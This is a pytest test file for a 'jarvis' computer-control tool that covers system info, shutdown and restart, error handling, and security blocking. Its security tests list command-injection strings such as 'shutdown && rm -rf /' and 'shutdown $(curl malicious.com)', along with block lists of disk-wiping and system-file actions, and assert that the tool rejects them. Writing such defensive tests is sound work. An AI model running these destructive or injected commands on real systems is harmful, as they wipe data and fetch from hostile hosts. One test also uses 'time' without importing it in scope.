"""Phase 6: Comprehensive Computer Control Tests - High Priority."""

from __future__ import annotations

import pytest
import subprocess
import platform
from unittest.mock import Mock, patch, MagicMock
from typing import Any

from jarvis.tools.computer_control import computer_control


class TestComputerControlBasicFunctionality:
    """Test computer control basic functionality."""

    def test_computer_info_success(self):
        """Test successful computer info retrieval."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.platform.release', return_value='10'):
                with patch('jarvis.tools.computer_control.platform.machine', return_value='AMD64'):
                    with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=25.5):
                        with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                            mock_memory_obj = Mock()
                            mock_memory_obj.total = 8589934592  # 8GB
                            mock_memory_obj.available = 4294967296  # 4GB
                            mock_memory_obj.percent = 50.0
                            mock_memory.return_value = mock_memory_obj
                            
                            result = computer_control({"action": "info"}, player=mock_player)
                            
                            assert "Windows" in result
                            assert "CPU" in result
                            assert "Memory" in result
                            mock_player.write_log.assert_called()

    def test_computer_info_missing_action(self):
        """Test computer info with missing action."""
        mock_player = Mock()
        
        result = computer_control({}, player=mock_player)
        
        assert "action" in result.lower() or "required" in result.lower() or "error" in result.lower()

    def test_computer_info_invalid_action(self):
        """Test computer info with invalid action."""
        mock_player = Mock()
        
        result = computer_control({"action": "invalid_action"}, player=mock_player)
        
        assert "invalid" in result.lower() or "not supported" in result.lower() or "error" in result.lower()

    def test_computer_shutdown_success(self):
        """Test successful shutdown command."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0)
            
            result = computer_control({"action": "shutdown"}, player=mock_player)
            
            assert "shutdown" in result.lower() or "initiated" in result.lower()
            mock_run.assert_called_once()

    def test_computer_restart_success(self):
        """Test successful restart command."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0)
            
            result = computer_control({"action": "restart"}, player=mock_player)
            
            assert "restart" in result.lower() or "initiated" in result.lower()
            mock_run.assert_called_once()

    def test_computer_sleep_success(self):
        """Test successful sleep command."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.subprocess.run') as mock_run:
            mock_run.return_value = Mock(returncode=0)
            
            result = computer_control({"action": "sleep"}, player=mock_player)
            
            assert "sleep" in result.lower() or "initiated" in result.lower()
            mock_run.assert_called_once()


class TestComputerControlSecurityValidation:
    """Test computer control security validation."""

    def test_block_dangerous_commands(self):
        """Test blocking dangerous commands."""
        mock_player = Mock()
        
        dangerous_actions = [
            "format_c",
            "delete_system",
            "rm_rf",
            "dd_if",
            "mkfs",
            "fdisk",
            "diskpart"
        ]
        
        for action in dangerous_actions:
            result = computer_control({"action": action}, player=mock_player)
            
            assert "blocked" in result.lower() or "not allowed" in result.lower() or "dangerous" in result.lower()

    def test_block_command_injection(self):
        """Test blocking command injection attempts."""
        mock_player = Mock()
        
        injection_attempts = [
            "shutdown && rm -rf /",
            "restart | format c:",
            "sleep; del /s /q *.*",
            "info `malicious command`",
            "shutdown $(curl malicious.com)"
        ]
        
        for injection in injection_attempts:
            result = computer_control({"action": injection}, player=mock_player)
            
            assert "blocked" in result.lower() or "not allowed" in result.lower() or "invalid" in result.lower()

    def test_allow_safe_commands(self):
        """Test allowing safe commands."""
        mock_player = Mock()
        
        safe_actions = [
            "info",
            "status",
            "uptime",
            "processes"
        ]
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=25.5):
                with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                    mock_memory_obj = Mock()
                    mock_memory_obj.total = 8589934592
                    mock_memory_obj.available = 4294967296
                    mock_memory_obj.percent = 50.0
                    mock_memory.return_value = mock_memory_obj
                    
                    for action in safe_actions:
                        result = computer_control({"action": action}, player=mock_player)
                        
                        # Should not be blocked
                        assert "blocked" not in result.lower()

    def test_parameter_validation(self):
        """Test parameter validation."""
        mock_player = Mock()
        
        invalid_params = [
            {"action": 123},  # Numeric action
            {"action": None}, # None action
            {"action": []},   # List action
            {"action": {}},   # Dict action
        ]
        
        for params in invalid_params:
            result = computer_control(params, player=mock_player)
            assert "error" in result.lower() or "invalid" in result.lower()


class TestComputerControlPlatformSpecific:
    """Test computer control platform-specific behavior."""

    def test_windows_shutdown(self):
        """Test Windows shutdown command."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.subprocess.run') as mock_run:
                mock_run.return_value = Mock(returncode=0)
                
                result = computer_control({"action": "shutdown"}, player=mock_player)
                
                assert "shutdown" in result.lower()
                # Should use Windows shutdown command
                call_args = mock_run.call_args
                assert "shutdown" in str(call_args)

    def test_linux_shutdown(self):
        """Test Linux shutdown command."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Linux'):
            with patch('jarvis.tools.computer_control.subprocess.run') as mock_run:
                mock_run.return_value = Mock(returncode=0)
                
                result = computer_control({"action": "shutdown"}, player=mock_player)
                
                assert "shutdown" in result.lower()
                # Should use Linux shutdown command

    def test_macos_shutdown(self):
        """Test macOS shutdown command."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Darwin'):
            with patch('jarvis.tools.computer_control.subprocess.run') as mock_run:
                mock_run.return_value = Mock(returncode=0)
                
                result = computer_control({"action": "shutdown"}, player=mock_player)
                
                assert "shutdown" in result.lower()
                # Should use macOS shutdown command

    def test_unsupported_platform(self):
        """Test unsupported platform handling."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='UnknownOS'):
            result = computer_control({"action": "info"}, player=mock_player)
            
            assert isinstance(result, str)
            # Should handle unknown platform gracefully


class TestComputerControlSystemInfo:
    """Test computer control system information retrieval."""

    def test_cpu_info_retrieval(self):
        """Test CPU information retrieval."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=75.5):
                with patch('jarvis.tools.computer_control.psutil.cpu_count', return_value=8):
                    with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                        mock_memory_obj = Mock()
                        mock_memory_obj.total = 8589934592
                        mock_memory_obj.percent = 50.0
                        mock_memory.return_value = mock_memory_obj
                        
                        result = computer_control({"action": "info"}, player=mock_player)
                        
                        assert "75.5" in result or "CPU" in result
                        assert "8" in result or "cores" in result.lower()

    def test_memory_info_retrieval(self):
        """Test memory information retrieval."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=25.5):
                with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                    mock_memory_obj = Mock()
                    mock_memory_obj.total = 17179869184  # 16GB
                    mock_memory_obj.available = 8589934592   # 8GB
                    mock_memory_obj.percent = 50.0
                    mock_memory.return_value = mock_memory_obj
                    
                    result = computer_control({"action": "info"}, player=mock_player)
                    
                    assert "16GB" in result or "17179869184" in result
                    assert "50" in result and "%" in result

    def test_disk_info_retrieval(self):
        """Test disk information retrieval."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=25.5):
                with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                    mock_memory_obj = Mock()
                    mock_memory_obj.total = 8589934592
                    mock_memory_obj.percent = 50.0
                    mock_memory.return_value = mock_memory_obj
                    
                    with patch('jarvis.tools.computer_control.psutil.disk_usage') as mock_disk:
                        mock_disk_obj = Mock()
                        mock_disk_obj.total = 1000000000000  # 1TB
                        mock_disk_obj.used = 500000000000    # 500GB
                        mock_disk_obj.free = 500000000000    # 500GB
                        mock_disk.return_value = mock_disk_obj
                        
                        result = computer_control({"action": "info"}, player=mock_player)
                        
                        assert "1TB" in result or "1000GB" in result
                        assert "Disk" in result

    def test_network_info_retrieval(self):
        """Test network information retrieval."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=25.5):
                with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                    mock_memory_obj = Mock()
                    mock_memory_obj.total = 8589934592
                    mock_memory_obj.percent = 50.0
                    mock_memory.return_value = mock_memory_obj
                    
                    with patch('jarvis.tools.computer_control.psutil.net_if_addrs') as mock_net:
                        mock_net.return_value = {
                            'eth0': [{'family': 2, 'address': '192.168.1.100'}],
                            'wlan0': [{'family': 2, 'address': '192.168.1.101'}]
                        }
                        
                        result = computer_control({"action": "info"}, player=mock_player)
                        
                        assert "192.168.1.100" in result or "Network" in result

    def test_process_info_retrieval(self):
        """Test process information retrieval."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=25.5):
                with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                    mock_memory_obj = Mock()
                    mock_memory_obj.total = 8589934592
                    mock_memory_obj.percent = 50.0
                    mock_memory.return_value = mock_memory_obj
                    
                    with patch('jarvis.tools.computer_control.psutil.process_iter') as mock_processes:
                        mock_process = Mock()
                        mock_process.info = {'pid': 1234, 'name': 'test.exe', 'cpu_percent': 5.0}
                        mock_processes.return_value = [mock_process]
                        
                        result = computer_control({"action": "processes"}, player=mock_player)
                        
                        assert "test.exe" in result or "1234" in result


class TestComputerControlErrorHandling:
    """Test computer control error handling."""

    def test_permission_denied_error(self):
        """Test permission denied error."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.subprocess.run') as mock_run:
            mock_run.side_effect = PermissionError("Permission denied")
            
            result = computer_control({"action": "shutdown"}, player=mock_player)
            
            assert "permission" in result.lower() or "denied" in result.lower() or "error" in result.lower()

    def test_subprocess_timeout(self):
        """Test subprocess timeout."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.subprocess.run') as mock_run:
            mock_run.side_effect = subprocess.TimeoutExpired("cmd", 10)
            
            result = computer_control({"action": "shutdown"}, player=mock_player)
            
            assert "timeout" in result.lower() or "error" in result.lower()

    def test_psutil_error(self):
        """Test psutil error."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.psutil.cpu_percent') as mock_cpu:
            mock_cpu.side_effect = Exception("psutil error")
            
            result = computer_control({"action": "info"}, player=mock_player)
            
            assert "error" in result.lower()

    def test_platform_detection_error(self):
        """Test platform detection error."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system') as mock_system:
            mock_system.side_effect = Exception("Platform detection failed")
            
            result = computer_control({"action": "info"}, player=mock_player)
            
            assert "error" in result.lower()

    def test_command_not_found(self):
        """Test command not found error."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.subprocess.run') as mock_run:
            mock_run.side_effect = FileNotFoundError("Command not found")
            
            result = computer_control({"action": "shutdown"}, player=mock_player)
            
            assert "not found" in result.lower() or "error" in result.lower()


class TestComputerControlEdgeCases:
    """Test computer control edge cases."""

    def test_very_high_cpu_usage(self):
        """Test very high CPU usage reporting."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=99.9):
                with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                    mock_memory_obj = Mock()
                    mock_memory_obj.total = 8589934592
                    mock_memory_obj.percent = 50.0
                    mock_memory.return_value = mock_memory_obj
                    
                    result = computer_control({"action": "info"}, player=mock_player)
                    
                    assert "99.9" in result or "high" in result.lower()

    def test_very_low_memory(self):
        """Test very low memory reporting."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=25.5):
                with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                    mock_memory_obj = Mock()
                    mock_memory_obj.total = 8589934592
                    mock_memory_obj.available = 858993  # Very low memory
                    mock_memory_obj.percent = 99.9
                    mock_memory.return_value = mock_memory_obj
                    
                    result = computer_control({"action": "info"}, player=mock_player)
                    
                    assert "99.9" in result or "critical" in result.lower()

    def test_no_network_interfaces(self):
        """Test no network interfaces."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=25.5):
                with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                    mock_memory_obj = Mock()
                    mock_memory_obj.total = 8589934592
                    mock_memory_obj.percent = 50.0
                    mock_memory.return_value = mock_memory_obj
                    
                    with patch('jarvis.tools.computer_control.psutil.net_if_addrs') as mock_net:
                        mock_net.return_value = {}
                        
                        result = computer_control({"action": "info"}, player=mock_player)
                        
                        assert isinstance(result, str)
                        # Should handle no network interfaces gracefully

    def test_no_running_processes(self):
        """Test no running processes."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.process_iter') as mock_processes:
                mock_processes.return_value = []
                
                result = computer_control({"action": "processes"}, player=mock_player)
                
                assert isinstance(result, str)
                # Should handle empty process list gracefully


class TestComputerControlIntegration:
    """Test computer control integration scenarios."""

    def test_player_integration(self):
        """Test player integration."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=25.5):
                with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                    mock_memory_obj = Mock()
                    mock_memory_obj.total = 8589934592
                    mock_memory_obj.percent = 50.0
                    mock_memory.return_value = mock_memory_obj
                    
                    result = computer_control({"action": "info"}, player=mock_player)
                    
                    # Should call player methods
                    mock_player.write_log.assert_called()
                    assert isinstance(result, str)

    def test_multiple_info_requests(self):
        """Test multiple info requests."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=25.5):
                with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                    mock_memory_obj = Mock()
                    mock_memory_obj.total = 8589934592
                    mock_memory_obj.percent = 50.0
                    mock_memory.return_value = mock_memory_obj
                    
                    # Multiple requests should work independently
                    result1 = computer_control({"action": "info"}, player=mock_player)
                    result2 = computer_control({"action": "info"}, player=mock_player)
                    result3 = computer_control({"action": "info"}, player=mock_player)
                    
                    assert all(isinstance(r, str) for r in [result1, result2, result3])

    def test_concurrent_operations(self):
        """Test concurrent operations."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=25.5):
                with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                    mock_memory_obj = Mock()
                    mock_memory_obj.total = 8589934592
                    mock_memory_obj.percent = 50.0
                    mock_memory.return_value = mock_memory_obj
                    
                    # Concurrent operations should work
                    results = []
                    for i in range(5):
                        result = computer_control({"action": "info"}, player=mock_player)
                        results.append(result)
                    
                    assert len(results) == 5
                    assert all(isinstance(r, str) for r in results)


class TestComputerControlPerformance:
    """Test computer control performance characteristics."""

    def test_fast_info_retrieval(self):
        """Test fast info retrieval performance."""
        import time
        
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=25.5):
                with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                    mock_memory_obj = Mock()
                    mock_memory_obj.total = 8589934592
                    mock_memory_obj.percent = 50.0
                    mock_memory.return_value = mock_memory_obj
                    
                    start_time = time.time()
                    result = computer_control({"action": "info"}, player=mock_player)
                    elapsed = time.time() - start_time
                    
                    assert isinstance(result, str)
                    # Should complete quickly
                    assert elapsed < 2.0

    def test_memory_usage_stability(self):
        """Test memory usage stability with multiple calls."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.cpu_percent', return_value=25.5):
                with patch('jarvis.tools.computer_control.psutil.virtual_memory') as mock_memory:
                    mock_memory_obj = Mock()
                    mock_memory_obj.total = 8589934592
                    mock_memory_obj.percent = 50.0
                    mock_memory.return_value = mock_memory_obj
                    
                    # Multiple calls should not leak memory
                    for i in range(50):
                        result = computer_control({"action": "info"}, player=mock_player)
                        assert isinstance(result, str)
                    
                    # Should not accumulate memory
                    assert True

    def test_large_process_list_handling(self):
        """Test handling large process lists."""
        mock_player = Mock()
        
        with patch('jarvis.tools.computer_control.platform.system', return_value='Windows'):
            with patch('jarvis.tools.computer_control.psutil.process_iter') as mock_processes:
                # Simulate large process list
                processes = []
                for i in range(100):
                    mock_process = Mock()
                    mock_process.info = {'pid': i, 'name': f'process_{i}.exe', 'cpu_percent': 1.0}
                    processes.append(mock_process)
                
                mock_processes.return_value = processes
                
                start_time = time.time()
                result = computer_control({"action": "processes"}, player=mock_player)
                elapsed = time.time() - start_time
                
                assert isinstance(result, str)
                # Should handle large lists efficiently
                assert elapsed < 3.0


class TestComputerControlSecurityAdvanced:
    """Test advanced security scenarios."""

    def test_privilege_escalation_prevention(self):
        """Test privilege escalation prevention."""
        mock_player = Mock()
        
        privilege_escalation_attempts = [
            "sudo_shutdown",
            "admin_restart",
            "root_sleep",
            "elevated_info"
        ]
        
        for attempt in privilege_escalation_attempts:
            result = computer_control({"action": attempt}, player=mock_player)
            
            assert "blocked" in result.lower() or "not allowed" in result.lower() or "invalid" in result.lower()

    def test_system_file_access_prevention(self):
        """Test system file access prevention."""
        mock_player = Mock()
        
        system_file_attempts = [
            "read_etc_passwd",
            "modify_boot_ini",
            "access_registry",
            "delete_system32"
        ]
        
        for attempt in system_file_attempts:
            result = computer_control({"action": attempt}, player=mock_player)
            
            assert "blocked" in result.lower() or "not allowed" in result.lower() or "invalid" in result.lower()

    def test_network_command_prevention(self):
        """Test network command prevention."""
        mock_player = Mock()
        
        network_attempts = [
            "open_port",
            "start_server",
            "network_scan",
            "download_file"
        ]
        
        for attempt in network_attempts:
            result = computer_control({"action": attempt}, player=mock_player)
            
            assert "blocked" in result.lower() or "not allowed" in result.lower() or "invalid" in result.lower()

    def test_case_sensitivity_in_blocking(self):
        """Test case sensitivity in security blocking."""
        mock_player = Mock()
        
        dangerous_variants = [
            "SHUTDOWN", "Shutdown", "shutdown",
            "RESTART", "Restart", "restart",
            "FORMAT_C", "Format_C", "format_c"
        ]
        
        for variant in dangerous_variants:
            result = computer_control({"action": variant}, player=mock_player)
            
            # Should handle case sensitivity appropriately
            assert isinstance(result, str)
